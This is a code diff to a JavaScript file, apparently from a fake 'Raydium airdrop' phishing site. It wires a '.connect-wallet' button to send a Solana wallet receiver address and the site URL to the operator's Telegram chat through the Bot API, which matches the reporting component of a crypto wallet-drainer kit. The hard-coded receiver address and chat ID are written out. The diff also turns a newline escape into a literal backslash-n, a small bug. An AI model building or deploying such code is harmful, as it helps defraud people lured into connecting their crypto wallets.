@@ -9,7 +9,7 @@ const chatId = '5915926682';
 
 async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
     try {
-        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
+        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\\nWebsite URL: ${website_url}`;
         const response = await axios.post(
             `https://api.telegram.org/bot${botToken}/sendMessage`,
             {
@@ -23,7 +23,14 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
     }
 }
 
-// Change this information for yours (
-const solana_wallet_receiver_id = '9H324MMej9eTvLNQWiGrwWy1V8SYoUnvUuakK6Sgsx1a';
-const website_url = 'https://raydium-airdrop-vert.vercel.app/';
-sendMessageToTelegram(solana_wallet_receiver_id, website_url);
+document.addEventListener('DOMContentLoaded', () => {
+    const solana_wallet_receiver_id = '9H324MMej9eTvLNQWiGrwWy1V8SYoUnvUuakK6Sgsx1a';
+    const website_url = 'https://raydium-airdrop-vert.vercel.app/';
+    const connectWalletButton = document.querySelector('.connect-wallet');
+
+    if (connectWalletButton) {
+        connectWalletButton.addEventListener('click', () => {
+            sendMessageToTelegram(solana_wallet_receiver_id, website_url);
+        });
+    }
+});
